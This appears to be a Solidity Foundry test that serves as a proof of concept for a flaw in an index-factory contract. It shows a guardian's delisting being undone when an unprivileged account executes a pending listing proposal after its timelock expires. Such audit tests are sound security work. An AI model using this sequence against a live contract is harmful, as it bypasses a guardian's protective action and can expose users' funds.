// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import {IndexFactoryTest} from "../IndexFactory.t.sol";
import {IIndexFactory} from "../../src/interfaces/IIndexFactory.sol";

contract RelistPoc is IndexFactoryTest {
    function test_poc_delistUndoneByPendingConfigChange() public {
        IIndexFactory.TokenConfig memory next = market.config(address(a), 0);
        vm.prank(owner);
        factory.proposeListing(address(a), next);
        vm.prank(guardian);
        factory.delist(address(a));
        assertFalse(factory.isWhitelisted(address(a)));
        vm.warp(factory.listingEta(address(a)));
        vm.prank(stranger);
        factory.executeListing(address(a));
        assertTrue(factory.isWhitelisted(address(a)), "stranger relisted a delisted token");
    }
}
